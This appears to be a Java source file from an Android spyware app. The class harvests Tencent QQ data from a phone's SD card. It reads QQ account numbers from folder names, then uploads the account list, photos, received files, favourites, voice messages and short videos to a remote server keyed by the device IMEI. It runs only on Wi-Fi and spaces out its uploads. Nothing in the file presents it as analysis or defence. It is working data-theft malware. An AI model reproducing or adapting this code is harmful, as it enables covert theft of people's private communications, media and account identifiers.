package com.phone.data;

import java.io.File;
import java.io.FileInputStream;
import org.json.JSONArray;
import org.json.JSONObject;
import android.content.Context;
import android.util.Log;
import com.authority.AuthoritySettings;
import com.main.ForegroundService;
import com.network.Network;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.UploadsFilter;
import com.utils.WriteDateFile;

public class UserQQData implements Runnable{
	private final String TAG = "UserQQData";


	private Context context;

	public UserQQData(Context context){
		this.context =context;
	}

	
	public void run(){
		try{
			if (AuthoritySettings.checkSinglePermission(context, 
					android.Manifest.permission.READ_EXTERNAL_STORAGE) == false){
				return;
			}
			
        	if(Network.getNetworkType(context) != Network.WIFI_CONNECTION){
        		return;
        	}
			
			String path = ForegroundService.SDCARDPATH + "/tencent/";
			File file = new File(path);
			if(file.exists() == false){
				path = ForegroundService.SDCARDPATH + "/Tencent/";
				file = new File(path);
				if (file.exists() == false) {
					return;
				}
			}
			
			getQQData(path);
			
		}catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("UserQQData run() exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
			return ;
		}
	}

    public void getQQData(String path){
    	
    	try{    	
    		JSONArray jsarray = new JSONArray();
        	int cnt = getQQAccounts(path ,"QWallet",jsarray);

        	cnt += getQQAccounts(path ,"MobileQQ",jsarray);
        	
        	cnt += getQQAccounts(path ,"MobileQQ/rijmmkv",jsarray);

        	if (jsarray.length() > 0) {
    	    	SendDataToServer.sendDataToServer(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,
    	    			Public.CMD_DATA_QQACCOUNT, Public.IMEI);
    	    	
    	    	WriteDateFile.writeLogFile("find qq number:" + jsarray.toString() + "\r\n");
    	    	Log.e(TAG, "qq account ok");
			}
        	
        	Log.e(TAG, "qq accounts:" + cnt);
        	
        	
        	String tmppath = "";
			tmppath =  path  + "qq_images/";
			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQPHOTO);
			
			tmppath =  path  + "QQ_Images/";
			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQPHOTO);

			tmppath =  path  + "qqfile_recv/";
			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQFILE);
			
			tmppath =  path  + "QQfile_recv/";
			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQFILE);
			
			tmppath =  path  + "QQ_Favorite/";
			//listTypeFiles(tmppath, Public.CMD_DATA_QQFILE);
			getFavorites(tmppath);
			
			getAccountsData(jsarray, path);
	    }
	    catch(Exception ex){
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getUserQQData exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
	    }
	    	
    }
    
	public int getQQAccounts(String path,String subpath,JSONArray ja){
		
		int cnt = 0;

		try {
			
	    	File pathfile = new File(path + subpath);
	    	if (pathfile.exists() == false) {
				return 0;
			}
	    	
	    	File[] allfiles = pathfile.listFiles();
	    	if(allfiles == null){
	    		return 0;
	    	}
	    	
			for (int i = 0; i < allfiles.length; i++) {
				String filename = allfiles[i].getName();
				if(PublicFunction.isInteger(filename) && filename.length() >= 5 && filename.length() <= 10){
					JSONObject jsobj = new JSONObject();
					jsobj.put("QQ", filename);
					ja.put(jsobj);
					
					cnt ++;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
			
		return cnt;
	}
    
    
    public void getFavorites(String filePath){
        File f = new File(filePath);
        if (!f.exists()) {
            return ;
        }

        File[] subFiles = f.listFiles();
        if (subFiles == null) {
			return ;
		}
        
        for (File subFile : subFiles) {
            if(subFile.isFile() && subFile.length() < Public.MAX_UPLOAD_FILESIZE && 
            		subFile.length() > Public.MIN_UPLOAD_FILESIZE){

    			if(UploadsFilter.filterFile(context, subFile.getName())){
    				continue;
    			}
            	
            	try {
        			String uploadfilename = subFile.getName() + ".jpg";
        			
        			FileInputStream fis = new FileInputStream(subFile);
        			int intfilesize  = (int)subFile.length();
        			int sendbufsize = 4 + uploadfilename.getBytes().length + 4 + intfilesize;
        			byte[]sendbuf = new byte[sendbufsize];
        			byte[] filename = uploadfilename.getBytes();
        			byte[] bytefilenamesize = PublicFunction.intToBytes(filename.length);
        			int i = 0;
        			int j = 0;
        			for( ; j < 4; j ++){
        				sendbuf[i + j] = bytefilenamesize[j];
        			}
        			i += j;
        			
        			for( j = 0; j < filename.length; j ++){
        				sendbuf[i + j] = filename[j];
        			}
        			i += j;

        			byte[] bytefilesize = PublicFunction.intToBytes(intfilesize);
        			for(j= 0 ; j < 4; j ++){
        				sendbuf[i + j] = bytefilesize[j];
        			}
        			i += j;
        			
        			fis.read(sendbuf, i, intfilesize);
        			fis.close();
        			i += intfilesize;
        			
        			SendDataToServer.sendDataToServer(sendbuf, sendbufsize,Public.CMD_DATA_QQFILE,Public.IMEI);
        			Thread.sleep(PhoneFiles.MEDIA_UPLOAD_DELAY);
				} catch (Exception e) {
					e.printStackTrace();
				}
            }
        }
    }
    
    
    public void getAccountsData(JSONArray jsa,String path){
    	try {
        	for (int i = 0; i < jsa.length(); i++) {
    			JSONObject js = jsa.getJSONObject(i);
    			
    			String qqno = js.optString("QQ");
    			
    			String tmppath =  path  + "MobileQQ/" + qqno + "/ptt/";
    			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQAUDIO);

    			tmppath =  path  + "MobileQQ/" + qqno+ "/shortvideo/";
    			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQVIDEO);
    			
    			tmppath =  path  + "MobileQQ/" + qqno+"/thumb/";
    			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQPHOTO);
    			
    			tmppath =  path  + "MobileQQ/" + qqno+ "/thumb2/";
    			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQPHOTO);
    			
    			tmppath =  path  + "MobileQQ/" + qqno+ "/photo/";
    			UploadsFilter.listTypeFiles(context,tmppath, Public.CMD_DATA_QQPHOTO);

    			//tmppath =  path  + "/MobileQQ/" + qqno + "/head/_SSOhd/";
    			//listTypeFiles(tmppath, Public.CMD_DATA_QQPROFILE);
    		}
		} catch (Exception e) {
			e.printStackTrace();
		}

    }
   
}
